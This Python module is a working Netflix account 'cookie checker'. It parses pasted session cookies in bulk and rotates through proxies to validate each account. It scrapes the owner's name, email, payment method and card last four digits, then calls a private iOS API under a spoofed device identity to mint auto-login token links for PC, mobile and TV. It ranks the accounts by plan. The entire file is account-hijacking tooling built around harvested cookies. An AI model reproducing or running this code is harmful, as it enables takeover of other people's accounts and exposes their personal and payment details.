"""Settings, cookie parsing, Netflix probing and plan classification."""

from __future__ import annotations

import html
import json
import os
import random
import re
import unicodedata
import urllib3
from dataclasses import dataclass, field
from datetime import datetime, timezone

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)
MEMBERSHIP_URL = "https://www.netflix.com/account/membership"
NFTOKEN_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"
RETRY_STATUS = {403, 429, 500, 502, 503, 504}
COOKIE_NAMES = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
DEVICES = ("pc", "mobile", "tv")

LINK_TEMPLATES = {
    "pc": "https://netflix.com/?nftoken={token}",
    "mobile": "https://netflix.com/unsupported?nftoken={token}",
    "tv": "https://netflix.com/tv2?nftoken={token}",
}

NFTOKEN_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","homeFeedTestTVMovieListsEnabled":"false","roarEnabled":"false","useCDSGalleryEnabled":"true","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.client.type": "argo",
    "x-netflix.context.locales": "en-US",
    "accept-language": "en-US;q=1",
    "x-netflix.context.ui-flavor": "argo",
}

PLAN_LABELS = {
    "premium": "Premium",
    "standard": "Standard",
    "standard_with_ads": "Standard With Ads",
    "basic": "Basic",
    "mobile": "Mobile",
    "free": "Free",
    "unknown": "Unknown",
    "invalid": "Invalid",
    "error": "Error",
}

PLAN_RANK = {
    "premium": 90,
    "standard": 80,
    "standard_with_ads": 70,
    "basic": 60,
    "mobile": 50,
    "unknown": 40,
    "free": 30,
    "invalid": 20,
    "error": 10,
}

PLAN_ALIASES = {
    "premium": {"premium", "premium_plan", "premium_extra_member", "cao_cap", "ozel", "高級", "高级"},
    "standard_with_ads": {
        "standard_with_ads",
        "standardwithads",
        "standard_avec_pub",
        "estandar_con_anuncios",
        "padrao_com_anuncios",
        "basic_with_ads",
        "附广告标准",
    },
    "standard": {"standard", "estandar", "padrao", "standart", "standardowy", "标准", "標準"},
    "basic": {"basic", "basico", "basique", "essentiel", "base", "dasar", "基本"},
    "mobile": {"mobile", "ponsel", "seluler", "movil", "モバイル"},
}

EXTRA_MARKERS = ("extra member", "miembro extra", "suscriptor extra", "membro extra", "assinante extra", "额外成员", "額外成員")
HOLD_MARKERS = ("hold", "past_due", "payment_retry", "paused", "suspend", "delinquent")


def _env_int(name: str, default: int, low: int, high: int) -> int:
    try:
        return max(low, min(high, int(os.getenv(name, default))))
    except (TypeError, ValueError):
        return default


@dataclass(frozen=True)
class Settings:
    token: str | None
    proxies: tuple[dict, ...]
    concurrency: int
    max_concurrency: int
    max_cookies: int
    max_jobs: int
    ttl: int
    timeout: float
    retries: int
    token_attempts: int
    nftoken: bool


def _parse_proxy(line: str) -> dict | None:
    value = re.sub(r"^([a-z][a-z0-9+.-]*):/+", r"\1://", line.strip(), flags=re.I)
    if not value or value.startswith("#"):
        return None
    match = re.match(
        r"^(?:(?P<scheme>https?|socks5h?|socks4a?)://)?"
        r"(?:(?P<user>[^:@\s]+):(?P<password>[^@\s]+)@)?"
        r"(?P<host>[^:\s@]+):(?P<port>\d+)"
        r"(?:@(?P<user2>[^:@\s]+):(?P<password2>\S+))?$",
        value,
        flags=re.I,
    )
    if not match:
        return None
    data = match.groupdict()
    scheme = (data["scheme"] or "http").lower()
    user = data["user"] or data["user2"]
    password = data["password"] or data["password2"]
    auth = f"{user}:{password}@" if user and password else ""
    url = f"{scheme}://{auth}{data['host']}:{data['port']}"
    return {"http": url, "https": url}


def parse_proxy_text(text: str | None) -> list[dict]:
    pool = []
    for chunk in (text or "").replace("\r", "\n").split("\n"):
        for line in chunk.split(","):
            parsed = _parse_proxy(line)
            if parsed:
                pool.append(parsed)
    return pool


SETTINGS = Settings(
    token=(os.getenv("ACCESS_TOKEN") or "").strip() or None,
    proxies=tuple(parse_proxy_text(os.getenv("PROXY_LIST"))),
    concurrency=_env_int("DEFAULT_CONCURRENCY", 8, 1, 64),
    max_concurrency=_env_int("MAX_CONCURRENCY", 32, 1, 128),
    max_cookies=_env_int("MAX_COOKIES_PER_JOB", 250, 1, 5000),
    max_jobs=_env_int("MAX_ACTIVE_JOBS", 8, 1, 64),
    ttl=_env_int("JOB_TTL_SECONDS", 3600, 300, 86400),
    timeout=float(_env_int("REQUEST_TIMEOUT_SECONDS", 20, 5, 120)),
    retries=_env_int("CHECK_RETRIES", 3, 1, 10),
    token_attempts=_env_int("NFTOKEN_ATTEMPTS", 3, 1, 10),
    nftoken=(os.getenv("NFTOKEN_ENABLED", "true").lower() not in {"0", "false", "no", "off"}),
)

_CANON = {name.lower(): name for name in COOKIE_NAMES}
_RAW_PATTERN = re.compile(
    r"(?P<name>" + "|".join(COOKIE_NAMES) + r")\s*(?:=|:)\s*(?P<value>\"[^\"]*\"|'[^']*'|[^;\s]+)", re.I
)


def canonical(name: str | None) -> str:
    raw = str(name or "").strip()
    return _CANON.get(raw.lower(), raw)


def parse_cookies(text: str) -> list[dict[str, str]]:
    """Return one cookie dict per account found in the pasted text."""
    if not text or not text.strip():
        return []

    pairs: list[tuple[str, str]] = []
    try:
        payload = json.loads(text)
        if isinstance(payload, dict):
            payload = payload.get("cookies") or payload.get("items") or [payload]
        if isinstance(payload, list):
            pairs = [(c.get("name"), c.get("value")) for c in payload if isinstance(c, dict)]
    except ValueError:
        pass

    if not pairs:
        for line in text.splitlines():
            parts = line.strip().split("\t")
            if len(parts) >= 7 and parts[1].upper() in ("TRUE", "FALSE"):
                pairs.append((parts[5], "\t".join(parts[6:])))
        if not pairs:
            pairs = [
                (match.group("name"), match.group("value").strip("'\"").rstrip(","))
                for match in _RAW_PATTERN.finditer(text)
            ]

    by_name: dict[str, list[str]] = {}
    for name, value in pairs:
        name = canonical(name)
        if name in COOKIE_NAMES and value:
            by_name.setdefault(name, []).append(value)

    bundles: list[dict[str, str]] = []
    seen: set[str] = set()
    for index in range(len(by_name.get("NetflixId", []))):
        cookies = {}
        for name, values in by_name.items():
            if index < len(values):
                cookies[name] = values[index]
            elif len(values) == 1:
                cookies[name] = values[0]
        netflix_id = cookies.get("NetflixId")
        if netflix_id and netflix_id not in seen:
            seen.add(netflix_id)
            bundles.append(cookies)
    return bundles


def to_netscape(cookies: dict[str, str]) -> str:
    return "\n".join(f".netflix.com\tTRUE\t/\tTRUE\t0\t{name}\t{value}" for name, value in cookies.items())


def normalize(value: str | None) -> str:
    if not value:
        return ""
    simplified = unicodedata.normalize("NFKD", str(value))
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    return re.sub(r"[^\w]+", "_", simplified.lower()).strip("_")


def is_extra_member(info: dict) -> bool:
    for haystack in (info.get("plan_name") or "", info.get("membership_status") or ""):
        lowered = haystack.lower()
        if any(marker in lowered for marker in EXTRA_MARKERS):
            return True
        if any(marker in normalize(haystack) for marker in ("extra_member", "miembro_extra")):
            return True
    return False


def is_on_hold(info: dict) -> bool:
    hold = str(info.get("hold") or "").strip().lower()
    if hold in {"yes", "true"}:
        return True
    if hold in {"no", "false"}:
        return False
    return any(marker in normalize(info.get("membership_status")) for marker in HOLD_MARKERS)


def is_subscribed(info: dict) -> bool:
    return normalize(info.get("membership_status")) == "current_member" or is_extra_member(info)


def derive_plan(info: dict, subscribed: bool) -> tuple[str, str]:
    name = info.get("plan_name") or ""
    key = normalize(name)
    quality = normalize(info.get("quality"))
    streams = int(re.sub(r"\D", "", str(info.get("streams") or "0")) or 0)

    for canonical_plan, aliases in PLAN_ALIASES.items():
        if key in aliases:
            return canonical_plan, PLAN_LABELS[canonical_plan]
    if is_extra_member(info):
        return "premium", "Premium (Extra Member)"
    if streams:
        if streams >= 4 or quality in {"uhd", "ultra_hd", "4k"}:
            return "premium", PLAN_LABELS["premium"]
        if streams >= 2 or quality in {"hd", "full_hd"}:
            return "standard", PLAN_LABELS["standard"]
        if key in PLAN_ALIASES["mobile"]:
            return "mobile", PLAN_LABELS["mobile"]
        return "basic", PLAN_LABELS["basic"]
    if name:
        return key or "unknown", name
    return ("unknown", PLAN_LABELS["unknown"]) if subscribed else ("free", PLAN_LABELS["free"])


def sort_key(result: dict) -> tuple:
    return (
        -PLAN_RANK.get(result.get("plan") or "error", 0),
        0 if result.get("status") == "valid" else 1,
        result.get("country") or "ZZ",
        result.get("index", 0),
    )


def _clean(value) -> str | None:
    if value is None:
        return None
    text = html.unescape(str(value))
    text = text.replace("\\u00A0", " ").replace("\\/", "/").replace('\\"', '"')
    text = re.sub(r"\\u([0-9a-fA-F]{4})", lambda m: chr(int(m.group(1), 16)), text)
    text = re.sub(r"\s+", " ", text).strip()
    return text or None


def _first(patterns, page: str) -> str | None:
    for pattern in patterns:
        match = re.search(pattern, page, re.I)
        if match:
            value = _clean(match.group(1))
            if value:
                return value
    return None


def extract_info(page: str) -> dict:
    info = {
        "country": _first([r'"currentCountry"\s*:\s*"([^"]+)"', r'"countryOfSignup"\s*:\s*"([^"]+)"'], page),
        "membership_status": _first([r'"membershipStatus"\s*:\s*"([^"]+)"'], page),
        "plan_name": _first(
            [r'"localizedPlanName"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"', r'"currentPlan"\s*:\s*\{[\s\S]{0,400}?"name"\s*:\s*"([^"]+)"'],
            page,
        ),
        "quality": _first([r'"videoQuality"\s*:\s*"([^"]+)"'], page),
        "streams": _first([r'"maxStreams"\s*:\s*"?(\d+)"?'], page),
        "hold": _first([r'"isUserOnHold"\s*:\s*(true|false)', r'"holdStatus"\s*:\s*"([^"]+)"'], page),
        "name": _first([r'"accountOwnerName"\s*:\s*"([^"]+)"', r'"firstName"\s*:\s*"([^"]+)"'], page),
        "email": _first([r'"emailAddress"\s*:\s*"([^"]+)"', r'"loginId"\s*:\s*"([^"]+)"'], page),
        "next_billing": _first([r'"nextBillingDate"\s*:\s*"([^"]+)"'], page),
        "member_since": _first([r'"memberSince"\s*:\s*"([^"]+)"'], page),
        "price": _first([r'"formattedPlanPrice"\s*:\s*"([^"]+)"', r'"displayPrice"\s*:\s*"([^"]+)"'], page),
        "payment": _first([r'"paymentMethod"\s*:\s*"([^"]+)"', r'"paymentType"\s*:\s*"([^"]+)"'], page),
        "card": _first([r'"lastFour"\s*:\s*"([^"]+)"'], page),
        "profiles": [value for value in re.findall(r'"profileName"\s*:\s*"([^"]+)"', page) if value],
    }
    return {key: value for key, value in info.items() if value not in (None, "", [])}


@dataclass
class Outcome:
    status: str
    info: dict = field(default_factory=dict)
    error: str | None = None


def check_account(cookies: dict[str, str], pool: list[dict], settings: Settings = SETTINGS) -> Outcome:
    headers = {"User-Agent": UA, "Accept": "text/html,*/*;q=0.8", "Accept-Encoding": "identity"}
    last_error = "network error"

    for attempt in range(settings.retries):
        proxy = pool[attempt % len(pool)] if pool else None
        session = requests.Session()
        session.cookies.update(cookies)
        try:
            response = session.get(
                MEMBERSHIP_URL,
                headers=headers,
                proxies=proxy,
                timeout=(settings.timeout / 2, settings.timeout),
            )
            if response.status_code in RETRY_STATUS:
                last_error = f"HTTP {response.status_code}"
                if attempt < settings.retries - 1:
                    continue
                return Outcome("error", error=last_error)
            if response.status_code != 200:
                return Outcome("invalid", error=f"HTTP {response.status_code}")
            if "/login" in response.url:
                return Outcome("invalid", error="cookie expired (login redirect)")

            info = extract_info(response.text or "")
            if not info.get("country") and not info.get("membership_status") and not info.get("plan_name"):
                last_error = "incomplete account page"
                if attempt < settings.retries - 1:
                    continue
                return Outcome("invalid", error=last_error)
            return Outcome("ok", info=info)
        except requests.exceptions.Timeout:
            last_error = "timeout"
        except requests.exceptions.ProxyError:
            last_error = "proxy error"
        except requests.exceptions.RequestException as exc:
            last_error = type(exc).__name__
        finally:
            session.close()

    return Outcome("error", error=last_error)


def create_nftoken(netflix_id: str, proxy: dict | None, settings: Settings = SETTINGS) -> tuple[str | None, str | None]:
    """Return (token, expiry) or (None, error)."""
    if not netflix_id:
        return None, "missing NetflixId"

    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    last_error = "nftoken api error"

    for attempt in range(settings.token_attempts):
        try:
            response = requests.get(
                NFTOKEN_URL,
                params=NFTOKEN_PARAMS,
                headers=headers,
                proxies=proxy,
                timeout=(settings.timeout / 2, settings.timeout),
                verify=False,
            )
            if response.status_code != 200:
                last_error = f"HTTP {response.status_code}"
                continue
            node = ((((response.json().get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {})
            token = _clean(node.get("token"))
            if not token:
                last_error = "token missing in response"
                continue
            expiry = None
            try:
                stamp = int(node.get("expires") or 0)
                stamp = stamp // 1000 if len(str(abs(stamp))) == 13 else stamp
                expiry = datetime.fromtimestamp(stamp, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
            except (TypeError, ValueError, OSError, OverflowError):
                expiry = None
            return token, expiry
        except requests.exceptions.RequestException as exc:
            last_error = type(exc).__name__
        except ValueError:
            last_error = "invalid json response"
    return None, last_error


def build_links(token: str, devices: list[str]) -> list[dict]:
    return [{"device": device, "url": LINK_TEMPLATES[device].format(token=token)} for device in devices if device in LINK_TEMPLATES]


def pick_devices(raw: list[str] | None) -> list[str]:
    wanted = {str(item).strip().lower() for item in (raw or [])}
    if "all" in wanted:
        return list(DEVICES)
    return [device for device in DEVICES if device in wanted]


def random_offset(size: int) -> int:
    return random.randrange(size) if size else 0
